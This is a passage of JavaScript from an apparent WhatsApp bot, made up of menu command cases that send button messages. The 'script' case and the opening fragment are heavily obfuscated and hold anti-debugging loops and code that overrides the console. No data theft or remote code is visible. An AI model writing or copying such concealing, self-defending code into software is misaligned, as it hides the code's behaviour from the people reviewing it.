_0x2fb552=_0x956bb3[_0x5d9c8f(0x2b7,0x98,0x1d6,0x1f1,'eIO%')+_0x10b46a(0x3f0,0x454,0x35d,'zy@z',0x3b7)+'r'][_0x10b46a(0x10,0x2ea,0x15f,'S(d$',0x53)+_0x1982d9(0x54a,0x413,0x55a,'S(d$',0x609)][_0x10b46a(0x2d6,0x21d,0x243,'@6)J',0x25a)](_0xb829),_0x585fbd=_0x855b5e[_0x411b3f],_0x370320=_0x47dc64[_0x585fbd]||_0x2fb552;_0x2fb552[_0x1982d9(0x523,0x5d9,0x59b,'tKGz',0x47f)+_0x10b46a(0x178,0x1e4,0x13f,'$626',0xb4)]=_0x2c4cad[_0x10b46a(0x2f4,0x13d,0x243,'@6)J',0x183)](_0x551446),_0x2fb552[_0x1982d9(0x5ba,0x564,0x444,'M#tc',0x5b7)+_0x1982d9(0x3e2,0x26b,0x3cd,'S(d$',0x2d7)]=_0x370320[_0x1982d9(0x37b,0x4db,0x408,'Jxb7',0x553)+_0x5b232b('zy@z',0x3b2,0x2e2,0x314,0x4cd)][_0x1bf8b2(-0x114,-0x1db,'QZ[f',-0x63,-0xea)](_0x370320),_0x2cd5fa[_0x585fbd]=_0x2fb552;}}[_0x4a9460(-0x121,-0xa7,-0x1b,-0x223,'qqf5')+_0x33ad6d('#pJJ',0x3f0,0x2db,0x380,0x222)+'r'](_0x37d1ab[_0x2ccf9c(0x151,0x199,0x15d,0xdd,'erlg')](_0x37d1ab[_0x33ad6d('xs$5',0x370,0x3a4,0x3d1,0x50a)],_0x37d1ab[_0x5e3ce9(0x709,'C9y4',0x5b9,0x6f3,0x6b1)]))[_0x2ccf9c(0x11b,0x28a,0x24f,0x210,'Jahw')](_0x37d1ab[_0xc9a98e(0x1d,0x241,'yO5)',0x169,0x26e)]));}}else{const _0x40e4cf=_0x3dfe72[_0xc9a98e(0x1c,0x16f,'sJi*',0x4a,0x68)](_0x1bcc60,_0x3dfe72[_0xc9a98e(-0x25,0xc8,'hvs7',0x154,0x1cb)](_0x3dfe72[_0xc9a98e(0x27,0xf1,'AXHU',0x131,-0xb)](_0x3dfe72[_0x33ad6d('gH*W',0x626,0x4d7,0x545,0x482)],_0x3dfe72[_0x2ccf9c(0x1d,-0xf5,0x8,-0x87,'DWhy')]),');'));_0x382790=_0x3dfe72[_0x33ad6d('$626',0x5f6,0x764,0x686,0x646)](_0x40e4cf);}}_0x37d1ab[_0x33ad6d('DWhy',0x569,0x78a,0x67e,0x71d)](_0x12ece2,++_0x185787);}}try{if(_0x37d1ab[_0x1542b6(0x663,0x63f,0x4f8,0x5a0,'Jahw')](_0x37d1ab[_0x1542b6(0x728,0x683,0x5c6,0x4e7,'mJo&')],_0x37d1ab[_0x2e6bb5(0x9,0x5c,0xa4,'jsfL',0x69)]))_0x37d1ab[_0x3df09a(0x39c,'1Kqg',0x4f3,0x323,0x287)](_0x572786,this,function(){const _0x2edc6e=new _0x1ec522(_0x37d1ab[_0x210a9a(0x291,0x1fd,'$626',0x152,0x25c)]),_0x29cc1d=new _0x587976(_0x37d1ab[_0x210a9a(0x2dc,0x264,'Jahw',0x24a,0x1e0)],'i');function _0x12b161(_0x2b1f79,_0x2aaa44,_0xfd7397,_0x3367f7,_0x4b5f92){return _0x2e6bb5(_0x2b1f79-0x125,_0x2aaa44- -0x1a,_0xfd7397-0xd7,_0x4b5f92,_0x4b5f92-0x2e);}function _0x210a9a(_0x27cfe2,_0x67d83b,_0x5a4f5c,_0xdb27df,_0x233a27){return _0x303bd3(_0x27cfe2-0x19c,_0x233a27- -0xc9,_0x5a4f5c-0x1e6,_0x5a4f5c,_0x233a27-0x57);}function _0x30ead0(_0x1d603d,_0x1f9289,_0x2b6df8,_0x8ab1fc,_0x36b359){return _0x3df09a(_0x1d603d- -0x265,_0x1f9289,_0x2b6df8-0x58,_0x8ab1fc-0x1bf,_0x36b359-0x6f);}const _0x386520=_0x37d1ab[_0x16a2ea(0x29a,0x6,'2[!T',0x18a,0x2bc)](_0x3dee29,_0x37d1ab[_0x210a9a(0x218,0x193,'$626',0x129,0x218)]);function _0x24a3f1(_0x5d0052,_0x5a58cf,_0x1b945e,_0x5c7537,_0x4a1574){return _0x885c99(_0x5d0052-0x170,_0x5a58cf-0xd5,_0x5a58cf-0x235,_0x5c7537-0x92,_0x5c7537);}function _0x16a2ea(_0x45bcdb,_0x3768ef,_0x5d9f75,_0x48e939,_0x1ab51d){return _0x3df09a(_0x48e939- -0x380,_0x5d9f75,_0x5d9f75-0x161,_0x48e939-0x60,_0x1ab51d-0x190);}!_0x2edc6e[_0x16a2ea(0x97,0x28d,'xs$5',0x126,0x16c)](_0x37d1ab[_0x210a9a(0x4da,0x51e,'tKGz',0x336,0x3c1)](_0x386520,_0x37d1ab[_0x30ead0(0x15a,'nOc5',0x183,0xd2,0x5d)]))||!_0x29cc1d[_0x12b161(-0x13,-0x163,-0x286,-0xfc,'1f#!')](_0x37d1ab[_0x16a2ea(0x14e,0x2e3,'erlg',0x250,0x162)](_0x386520,_0x37d1ab[_0x30ead0(0x3ee,'EOWB',0x3ef,0x2e7,0x347)]))?_0x37d1ab[_0x24a3f1(0x4c7,0x35b,0x2d6,'erlg',0x455)](_0x386520,'0'):_0x37d1ab[_0x12b161(-0x28b,-0x1f9,-0x299,-0x2bf,'ePzo')](_0x3d0aee);})();else{if(_0x419247){if(_0x37d1ab[_0x2e6bb5(0x29,-0x15f,-0x156,'OZnV',-0x23c)](_0x37d1ab[_0x2e6bb5(-0xd2,0x57,0x1d4,'M#tc',-0x8a)],_0x37d1ab[_0x3df09a(0x46c,'yO5)',0x377,0x38d,0x5c6)]))return _0x12ece2;else(function(){return!![];}[_0x3df09a(0x5c3,'M#tc',0x55f,0x60f,0x576)+_0x1542b6(0x6dc,0x696,0x5fc,0x753,'OE8H')+'r'](_0x37d1ab[_0x3df09a(0x5f2,'$EY]',0x654,0x4cf,0x571)](_0x37d1ab[_0x885c99(0x1c0,0x3da,0x2bc,0x227,'S5SP')],_0x37d1ab[_0x885c99(0x2f9,0x2e8,0x264,0x21e,'PX3A')]))[_0x303bd3(0x2d1,0x293,0x406,'O$5^',0x3fe)](_0x37d1ab[_0x3df09a(0x669,'DWhy',0x675,0x610,0x65c)]));}else{if(_0x37d1ab[_0x2e6bb5(-0x30c,-0x199,-0x1fa,'tKGz',-0x2f3)](_0x37d1ab[_0x885c99(-0x1,0x21e,0x18f,0x230,'N)Zp')],_0x37d1ab[_0x3df09a(0x546,'M#tc',0x459,0x5c8,0x43f)]))_0x37d1ab[_0x2e6bb5(0x7d,-0xce,-0x1b0,'Jahw',-0x8f)](_0x12ece2,0x62*-0x5+-0xdec+0xfd6);else return _0x32e492;}}}catch(_0x2b1884){}}
break
case 'script': case 'sc':
function _0x14783f(_0x428bb1,_0x335daa,_0x47ec6a,_0x3579e6){return _0x5d99(_0x335daa-0x2d9,_0x3579e6);}function _0x2e52(){var _0x55ddd6=['D2fYBG','nJi0s3PyCgHe','yxbWBhK','mteWmde4nezcD1zKvW','zxHJzxb0Aw9U','tuXStg4','nJm2m25pBKrZDa','DgfIBgu','nZzqAMHxwNC','Ahr0Chm6lY95BW','uxfOBue','DxjSqNv0Dg9U','y29UC3rYDwn0BW','zgLZCgXHEvrLEa','u291CMnLienVza','mJu4mtDiv2v1tNi','zxjYB3i','Dg9tDhjPBMC','C3bSAxq','vNrsuxK','y3rVCIGICMv0Dq','D2nxEwS','ndKXmJKWnev2t2PjBa','AeHVyMu','BhPKt0W','yKveyNu','Dxr1yMuUy29TlW','wK1jz1u','ntC0mJe1Bu9ruxv1','CwTnzfC','ywnjBu0','tvr1t0u','BMn0Aw9UkcKG','E30Uy29UC3rYDq','mZbWEuXit1C','y3f2r2i','BgvUz3rO','A2TysKm','EKnHrhK','C2vHCMnO','wNbXAvC','CMv0DxjUicHMDq','mJK2wKDtDhb6','nZCWn2fgExfsDG','DxjS','EeTsCfi','ztrcsJD3nhffna','ChjVDg90ExbL','qMDpBhu','mJeYmJDZv1vKChq','y29UC29Szq','C2vUzdvcDxrjBq','Ag5QyMW','Ag5NrfK','yMLUza','DxLQsuO','kcGOlISPkYKRkq','rhznwMW','vKTtrhu','y2HHBM5LBc9vqW','CM4GDgHPCYiPka','sffUDfe','x19WCM90B19F','vLn1qw4','nJGZmePhBgPvCq'];_0x2e52=function(){return _0x55ddd6;};return _0x2e52();}(function(_0x250efa,_0x4b2672){var _0x523da7=_0x250efa();function _0x486198(_0x504309,_0x42259a,_0x410b07,_0x10308d){return _0x5d99(_0x42259a- -0x289,_0x10308d);}function _0xec45(_0x312204,_0x12ad90,_0x2f5208,_0x38d1a2){return _0x5d99(_0x312204- -0x266,_0x12ad90);}while(!![]){try{var _0x49213f=-parseInt(_0xec45(-0xa2,-0xc0,-0x8c,-0xc0))/(-0x74f+0x55c+0x4*0x7d)*(parseInt(_0x486198(-0x9d,-0xad,-0x8d,-0x8d))/(0x1*0x2227+0x793*0x5+0x1a3*-0x2c))+-parseInt(_0xec45(-0xb7,-0x96,-0xa9,-0x9e))/(-0xd81+-0x3*-0xa03+-0x1*0x1085)+parseInt(_0x486198(-0xcb,-0xe0,-0xce,-0xf2))/(0x3c6+-0x191b*-0x1+-0x1cdd)+-parseInt(_0xec45(-0xb1,-0xc1,-0xac,-0xa5))/(0x5c9*-0x2+0x261f+0x46c*-0x6)*(-parseInt(_0xec45(-0x8f,-0x98,-0x92,-0x96))/(-0xc6d+0xb51*-0x2+0x2315))+-parseInt(_0xec45(-0xa8,-0x8a,-0xc1,-0xc6))/(0x1*0x22e1+0xa2d+-0x2d07)*(parseInt(_0x486198(-0xea,-0xcc,-0xc3,-0xbb))/(0x2266+-0x3*-0x83+0x23e7*-0x1))+-parseInt(_0xec45(-0x8c,-0xaa,-0x9c,-0x81))/(0x68f*-0x5+-0x219*0x2+0x2506*0x1)*(parseInt(_0xec45(-0x93,-0x90,-0xa9,-0x89))/(-0x7e4*-0x1+-0x13b0+-0x1e*-0x65))+-parseInt(_0xec45(-0x83,-0x7e,-0x7a,-0x99))/(-0x1b83+0x12b4+-0xce*-0xb)*(parseInt(_0x486198(-0xa3,-0xb4,-0x9c,-0x9f))/(-0x39b*0x7+0x10*0x1ca+-0x357));if(_0x49213f===_0x4b2672)break;else _0x523da7['push'](_0x523da7['shift']());}catch(_0x453806){_0x523da7['push'](_0x523da7['shift']());}}}(_0x2e52,0xb980d*0x1+0x1327dd+0x144d3d*-0x1));function _0x5d99(_0x18317c,_0x225667){var _0x20a118=_0x2e52();return _0x5d99=function(_0x1f54e6,_0x32576a){_0x1f54e6=_0x1f54e6-(-0x16f*0x1b+0x1502+0x1356);var _0x5c6f7c=_0x20a118[_0x1f54e6];if(_0x5d99['sgoWKE']===undefined){var _0x1f235d=function(_0x59bc8a){var _0x287b96='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xf9218d='',_0x5bf7dd='',_0x653919=_0xf9218d+_0x1f235d;for(var _0x835e19=-0x1*0x1a0b+0x121d+0x7ee,_0xe93f98,_0x59b4ca,_0x42039b=0x1*-0x115d+0x12*-0x16e+0xb*0x3eb;_0x59b4ca=_0x59bc8a['charAt'](_0x42039b++);~_0x59b4ca&&(_0xe93f98=_0x835e19%(0x26f+0x206+-0x17b*0x3)?_0xe93f98*(0x8b6+0x1c84+0x1*-0x24fa)+_0x59b4ca:_0x59b4ca,_0x835e19++%(-0x1f*-0x65+-0x1*0x1442+0x80b*0x1))?_0xf9218d+=_0x653919['charCodeAt'](_0x42039b+(-0x1*0x21e+0x5b5+-0x38d))-(-0x25c2+-0x3b*-0x7f+0x887)!==0x6*0x597+0xea7+0x49*-0xa9?String['fromCharCode'](-0x1d1d+0x193*0xa+-0x3*-0x4ca&_0xe93f98>>(-(0x87d+0xc6d+-0x14e8)*_0x835e19&0x9ed+0xb*-0xf6+0xab)):_0x835e19:0x6ce+-0x1e7a+0x17ac){_0x59b4ca=_0x287b96['indexOf'](_0x59b4ca);}for(var _0xad91e4=-0x1cf*-0x13+-0x2160+-0xfd,_0x57d8f5=_0xf9218d['length'];_0xad91e4<_0x57d8f5;_0xad91e4++){_0x5bf7dd+='%'+('00'+_0xf9218d['charCodeAt'](_0xad91e4)['toString'](0x1*-0xf37+-0x19a5*0x1+-0x28ec*-0x1))['slice'](-(-0x20dd+-0x1e38+0x1*0x3f17));}return decodeURIComponent(_0x5bf7dd);};_0x5d99['qadTyx']=_0x1f235d,_0x18317c=arguments,_0x5d99['sgoWKE']=!![];}var _0x12cfea=_0x20a118[-0xd*-0x107+-0x4e8*0x7+0x14fd],_0x46c73f=_0x1f54e6+_0x12cfea,_0x73edd5=_0x18317c[_0x46c73f];if(!_0x73edd5){var _0x23d957=function(_0x4ee8c7){this['nItxdM']=_0x4ee8c7,this['cJOfLn']=[-0x2*-0xe8c+0xe*-0x170+-0x8f7,0x76d*0x1+-0xaec+-0x37f*-0x1,-0x15c1+0x3cd+0x2fe*0x6],this['CQhLVG']=function(){return'newState';},this['ZiYTAb']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['euRCgq']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x23d957['prototype']['ApHFcV']=function(){var _0x4eb408=new RegExp(this['ZiYTAb']+this['euRCgq']),_0x2d4e55=_0x4eb408['test'](this['CQhLVG']['toString']())?--this['cJOfLn'][-0x1b7b+0x1046+0xb36]:--this['cJOfLn'][-0x82a+-0x1aaa*-0x1+-0x4a0*0x4];return this['ErsITM'](_0x2d4e55);},_0x23d957['prototype']['ErsITM']=function(_0xcb686d){if(!Boolean(~_0xcb686d))return _0xcb686d;return this['EXcMwd'](this['nItxdM']);},_0x23d957['prototype']['EXcMwd']=function(_0x4a3dc2){for(var _0x2ae856=-0x65b*-0x3+0x4*0x4a+-0x1439,_0x1f7d6e=this['cJOfLn']['length'];_0x2ae856<_0x1f7d6e;_0x2ae856++){this['cJOfLn']['push'](Math['round'](Math['random']())),_0x1f7d6e=this['cJOfLn']['length'];}return _0x4a3dc2(this['cJOfLn'][0x1ac5+-0x1*-0x26+-0x1aeb*0x1]);},new _0x23d957(_0x5d99)['ApHFcV'](),_0x5c6f7c=_0x5d99['qadTyx'](_0x5c6f7c),_0x18317c[_0x46c73f]=_0x5c6f7c;}else _0x5c6f7c=_0x73edd5;return _0x5c6f7c;},_0x5d99(_0x18317c,_0x225667);}function _0x48edb9(_0x162ebb,_0x14b213,_0x1b5488,_0x3aaea3){return _0x5d99(_0x14b213- -0x34a,_0x162ebb);}var _0x3f0ec7=(function(){var _0x5dcbe3={};function _0x1d4734(_0x68bbdb,_0xfd8fa4,_0x329cdd,_0x55e6a6){return _0x5d99(_0x68bbdb- -0xb4,_0x55e6a6);}function _0x1032d9(_0x50465e,_0x39b264,_0x5ce317,_0x9facc0){return _0x5d99(_0x5ce317- -0x332,_0x9facc0);}_0x5dcbe3[_0x1d4734(0xf7,0xfb,0xfb,0xf7)]=_0x1032d9(-0x183,-0x157,-0x167,-0x185)+'+$',_0x5dcbe3[_0x1d4734(0xfa,0xec,0xfb,0x110)]=function(_0x1a2f41,_0x22a3b3){return _0x1a2f41===_0x22a3b3;},_0x5dcbe3[_0x1d4734(0xfd,0xec,0xea,0xff)]=_0x1032d9(-0x16d,-0x182,-0x182,-0x19d);var _0x308a74=_0x5dcbe3,_0x18507d=!![];return function(_0x338424,_0x1cd266){var _0x20982e=_0x18507d?function(){var _0x3c67ff={};_0x3c67ff[_0x2f0bb0(0x3cf,0x3ee,0x402,0x3df)]=_0x308a74[_0x320fab(0x3ff,0x3ea,0x3f6,0x415)];function _0x320fab(_0x5999fe,_0x2f4a35,_0x21325d,_0xc966f3){return _0x5d99(_0x21325d-0x24b,_0x2f4a35);}var _0x2664a1=_0x3c67ff;function _0x2f0bb0(_0x40100e,_0x15e749,_0x2d7635,_0x15a3ab){return _0x5d99(_0x15e749-0x236,_0x15a3ab);}if(_0x1cd266){if(_0x308a74['ZMIgU'](_0x320fab(0x414,0x413,0x3fb,0x3e4),_0x308a74[_0x320fab(0x3e2,0x3e0,0x3fc,0x407)])){var _0x244834=_0x1cd266[_0x320fab(0x43e,0x407,0x421,0x424)](_0x338424,arguments);return _0x1cd266=null,_0x244834;}else return _0xc28505[_0x320fab(0x3cf,0x3cf,0x3ef,0x3d8)]()[_0x320fab(0x3ee,0x3ee,0x405,0x400)](_0x2664a1[_0x320fab(0x419,0x3fb,0x403,0x3e6)])[_0x320fab(0x3ee,0x3f7,0x3ef,0x3ec)]()[_0x2f0bb0(0x41b,0x416,0x41d,0x41a)+'r'](_0x42e682)[_0x320fab(0x423,0x423,0x405,0x425)](_0x2664a1[_0x320fab(0x3f3,0x416,0x403,0x421)]);}}:function(){};return _0x18507d=![],_0x20982e;};}()),_0x45cc19=_0x3f0ec7(this,function(){var _0x47e84f={};function _0x244ddb(_0x5ac3c2,_0x557854,_0x60da5c,_0xd015d9){return _0x5d99(_0x60da5c- -0x2e0,_0x557854);}_0x47e84f[_0x5bcb80(0x544,0x52d,0x53c,0x54a)]=_0x244ddb(-0x12f,-0xfb,-0x115,-0xfd)+'+$';var _0x33d748=_0x47e84f;function _0x5bcb80(_0x3e201d,_0x2b05e8,_0x1f49f8,_0x122e87){return _0x5d99(_0x2b05e8-0x361,_0x1f49f8);}return _0x45cc19[_0x244ddb(-0x138,-0x126,-0x13c,-0x143)]()[_0x5bcb80(0x525,0x51b,0x502,0x52c)](_0x33d748[_0x5bcb80(0x543,0x52d,0x526,0x53c)])[_0x5bcb80(0x4ff,0x505,0x50c,0x4fc)]()[_0x5bcb80(0x53e,0x541,0x53f,0x548)+'r'](_0x45cc19)[_0x244ddb(-0x140,-0x131,-0x126,-0x123)](_0x33d748[_0x244ddb(-0xf6,-0x129,-0x114,-0x11e)]);});_0x45cc19();var _0x15773c=(function(){var _0x14f776={};_0x14f776[_0x2988d2(0x46a,0x467,0x45e,0x455)]=_0x548acb(0x459,0x459,0x460,0x454),_0x14f776[_0x548acb(0x467,0x482,0x465,0x476)]=_0x548acb(0x428,0x453,0x439,0x448),_0x14f776[_0x548acb(0x463,0x433,0x449,0x438)]=function(_0x6ae66d,_0x381576){return _0x6ae66d!==_0x381576;};function _0x2988d2(_0x46aa65,_0x580ace,_0x1cb9f1,_0x502abd){return _0x5d99(_0x46aa65-0x28c,_0x1cb9f1);}function _0x548acb(_0x558bf8,_0x15e78a,_0x55895c,_0x1e99cb){return _0x5d99(_0x55895c-0x293,_0x15e78a);}var _0x4d0ae3=_0x14f776,_0x28e4a4=!![];return function(_0x384ffa,_0x27aef3){var _0x14daae={};function _0x5020fd(_0x5453d9,_0x37c69f,_0x5a472a,_0x5ea077){return _0x2988d2(_0x5453d9- -0x50c,_0x37c69f-0x1e,_0x37c69f,_0x5ea077-0x187);}function _0x227c99(_0x30ada7,_0x1d5526,_0x5f0ead,_0x3bc280){return _0x2988d2(_0x1d5526- -0x541,_0x1d5526-0x1a9,_0x30ada7,_0x3bc280-0x41);}_0x14daae[_0x5020fd(-0xb0,-0x90,-0xbc,-0xbd)]=_0x4d0ae3[_0x227c99(-0xd8,-0xd7,-0xe3,-0xd8)],_0x14daae[_0x227c99(-0x105,-0x10b,-0xfa,-0x104)]=_0x4d0ae3[_0x227c99(-0xd7,-0xe3,-0xd6,-0xcd)];var _0x444e92=_0x14daae;if(_0x4d0ae3[_0x5020fd(-0xca,-0xb9,-0xdd,-0xe1)]('ZpqiW',_0x227c99(-0xf5,-0xfa,-0x112,-0xe4))){var _0x2e3c72=_0xace9e6[_0x227c99(-0xdb,-0xdf,-0xdb,-0xce)](_0xd35877,arguments);return _0x1f4020=null,_0x2e3c72;}else{var _0x2e640b=_0x28e4a4?function(){function _0x14283d(_0x54f3c9,_0x45aeeb,_0x4bbd27,_0x5b7006){return _0x5020fd(_0x4bbd27-0x474,_0x54f3c9,_0x4bbd27-0x1ea,_0x5b7006-0x5b);}function _0x3594db(_0x4bb890,_0x2a2ca2,_0x5eae50,_0x4b8755){return _0x5020fd(_0x4bb890-0x428,_0x5eae50,_0x5eae50-0x10d,_0x4b8755-0x1f1);}if(_0x444e92['HQntQ']===_0x444e92[_0x3594db(0x378,0x382,0x387,0x364)]){if(_0x27aef3){if(_0x444e92['hHobe']==='gObrD'){var _0x4d6d67=_0x3f1c85['constructo'+'r']['prototype']['bind'](_0x1ada22),_0xeecbeb=_0x505ce5[_0x2fde7b],_0x1399ad=_0x2e5ae6[_0xeecbeb]||_0x4d6d67;_0x4d6d67[_0x14283d(0x3ac,0x3ad,0x3c5,0x3cd)]=_0x3dca86[_0x3594db(0x371,0x369,0x36e,0x363)](_0x2cb38a),_0x4d6d67[_0x3594db(0x34c,0x340,0x350,0x36b)]=_0x1399ad[_0x3594db(0x34c,0x331,0x330,0x34d)][_0x14283d(0x3c2,0x3d8,0x3bd,0x3be)](_0x1399ad),_0x543007[_0xeecbeb]=_0x4d6d67;}else{var _0x1b01aa=_0x27aef3[_0x14283d(0x3ad,0x3b2,0x3ca,0x3b2)](_0x384ffa,arguments);return _0x27aef3=null,_0x1b01aa;}}}else _0xb29931=_0x4d1e80;}:function(){};return _0x28e4a4=![],_0x2e640b;}};}()),_0x143b93=_0x15773c(this,function(){var _0x5a99ab={'MLlLn':function(_0x3517c3,_0x55159f){return _0x3517c3(_0x55159f);},'xKRpR':function(_0x213d98,_0xe4f67e){return _0x213d98+_0xe4f67e;},'bEDbu':_0x2bed45(0x42b,0x425,0x42a,0x42d)+_0x2bed45(0x3f9,0x418,0x41d,0x3fb)+_0x5ebb39(0x323,0x304,0x302,0x30c)+'\x20)','nuWHv':function(_0x2f08a8){return _0x2f08a8();},'MTuOE':'log','zCaDy':_0x2bed45(0x451,0x445,0x43e,0x42a),'wcWyk':'info','BgOlu':_0x5ebb39(0x2ed,0x2d8,0x2c2,0x2e6),'hnjbl':_0x5ebb39(0x310,0x30d,0x32a,0x319),'qqJjo':'trace','pdVSA':function(_0x292e7d,_0x213ab0){return _0x292e7d<_0x213ab0;},'tSLsb':_0x2bed45(0x436,0x43b,0x441,0x42e),'hngDY':'0|1|3|5|4|'+'2'};function _0x5ebb39(_0x3fc807,_0x55bceb,_0x1c6c80,_0x31b523){return _0x5d99(_0x55bceb-0x135,_0x1c6c80);}var _0x35c9f8;try{var _0x182af8=_0x5a99ab[_0x2bed45(0x46b,0x44a,0x45e,0x460)](Function,_0x5a99ab[_0x2bed45(0x44d,0x431,0x442,0x43a)](_0x2bed45(0x436,0x42d,0x41d,0x416)+_0x5ebb39(0x2d0,0x2e8,0x308,0x2d6),_0x5a99ab[_0x2bed45(0x41c,0x41d,0x409,0x430)])+');');_0x35c9f8=_0x5a99ab['nuWHv'](_0x182af8);}catch(_0x50f82a){_0x35c9f8=window;}var _0x133ff2=_0x35c9f8[_0x2bed45(0x44a,0x436,0x437,0x44c)]=_0x35c9f8[_0x5ebb39(0x30e,0x2fa,0x2dc,0x310)]||{};function _0x2bed45(_0x56b8d4,_0x157d15,_0x58fb05,_0x10bdc2){return _0x5d99(_0x157d15-0x271,_0x56b8d4);}var _0x50a0ac=[_0x5a99ab[_0x2bed45(0x421,0x423,0x430,0x411)],_0x5a99ab[_0x2bed45(0x413,0x42a,0x436,0x424)],_0x5a99ab[_0x2bed45(0x418,0x419,0x3fb,0x40a)],_0x5a99ab[_0x5ebb39(0x30c,0x2f8,0x315,0x2e2)],_0x5a99ab[_0x5ebb39(0x317,0x2fc,0x305,0x2f3)],_0x5ebb39(0x304,0x310,0x32b,0x300),_0x5a99ab['qqJjo']];for(var _0x28cbe4=-0x3*0x4b1+-0x1e8+-0xffb*-0x1;_0x5a99ab['pdVSA'](_0x28cbe4,_0x50a0ac[_0x2bed45(0x416,0x428,0x424,0x40b)]);_0x28cbe4++){if(_0x5a99ab['tSLsb']===_0x2bed45(0x43f,0x43b,0x451,0x42b)){var _0x4f55bb=_0x5a99ab[_0x5ebb39(0x2e5,0x2fd,0x2ed,0x2eb)][_0x2bed45(0x433,0x416,0x411,0x3f7)]('|'),_0x1ba3e4=-0x1e32*-0x1+-0x25a7+0x1*0x775;while(!![]){switch(_0x4f55bb[_0x1ba3e4++]){case'0':var _0x1f02a9=_0x15773c['constructo'+'r'][_0x2bed45(0x444,0x433,0x427,0x444)]['bind'](_0x15773c);continue;case'1':var _0x350ae0=_0x50a0ac[_0x28cbe4];continue;case'2':_0x133ff2[_0x350ae0]=_0x1f02a9;continue;case'3':var _0x17b178=_0x133ff2[_0x350ae0]||_0x1f02a9;continue;case'4':_0x1f02a9[_0x2bed45(0x3fb,0x415,0x40c,0x428)]=_0x17b178['toString'][_0x2bed45(0x42d,0x43a,0x41e,0x42a)](_0x17b178);continue;case'5':_0x1f02a9[_0x5ebb39(0x2fd,0x306,0x306,0x325)]=_0x15773c[_0x5ebb39(0x2f1,0x2fe,0x2e5,0x30c)](_0x15773c);continue;}break;}}else{if(_0x2a222a){var _0x4616c0=_0x51929a['apply'](_0x321105,arguments);return _0x371f89=null,_0x4616c0;}}}});_0x143b93();{var riych=await getBuffer(picak+(_0x48edb9(-0x14d,-0x168,-0x172,-0x16d)+'e')),_0x287b49={};_0x287b49[_0x48edb9(-0x17d,-0x169,-0x160,-0x17d)+'t']='Subscribe',_0x287b49[_0x14783f(0x482,0x498,0x49a,0x4b6)]=''+sc;var _0x55b36c={};_0x55b36c[_0x48edb9(-0x179,-0x16b,-0x153,-0x16b)]=_0x287b49,await chika[_0x14783f(0x499,0x49f,0x4bb,0x488)+'g'](from,_0x48edb9(-0x178,-0x16d,-0x156,-0x15e)+_0x14783f(0x499,0x486,0x49d,0x46d)+_0x48edb9(-0x16e,-0x17c,-0x196,-0x15d)+'tM-pDaaGVR'+_0x48edb9(-0x1a1,-0x189,-0x1a8,-0x194)+'Bw','©\x20'+footer,riych,[_0x55b36c]);}
break
case 'menu':
await chika.send5ButImg(from, `` + '' + lang.menu(botname, pushname), `© ${footer}`,thumb, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Owner","id": 'owner'}},{"quickReplyButton": {"displayText": "List Menu","id": 'command'}}] )
break
case 'allmenu':
var riych = await getBuffer(picak+'All Menu')
await chika.send5ButImg(from, `` + '' + lang.allmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Owner","id": 'owner'}}] )
break
case 'groupmenu':
var riych = await getBuffer(picak+'Group Menu')
await chika.send5ButImg(from, `` + '' + lang.groupmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'rpgmenu':
var riych = await getBuffer(picak+'Rpg Menu')
await chika.send5ButImg(from, `` + '' + lang.rpgmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'downloadermenu':
var riych = await getBuffer(picak+'Downloader Menu')
await chika.send5ButImg(from, `` + '' + lang.downloadermenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'searchmenu':
var riych = await getBuffer(picak+'Search Menu')
await chika.send5ButImg(from, `` + '' + lang.searchmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'randommenu':
var riych = await getBuffer(picak+'Random Menu')
await chika.send5ButImg(from, `` + '' + lang.randommenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'searchmenu':
var riych = await getBuffer(picak+'Search Menu')
await chika.send5ButImg(from, `` + '' + lang.searchmenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'textpromenu':
var riych = await getBuffer(picak+'Textpro Menu')
await chika.send5ButImg(from, `` + '' + lang.textpromenu(prefix), `© ${footer}`,riych, [{"urlButton": {"displayText": "Source Code","url": `${sc}`}},{"urlButton": {"displayText": "Website","url": `${myweb}`}},{"quickReplyButton": {"displayText": "Donasi","id": 'donate'}},{"quickReplyButton": {"displayText": "Back List","id": 'command'}}] )
break
case 'photooxymenu':
var riych = await getBuffer(picak+'Photo Oxy Menu')
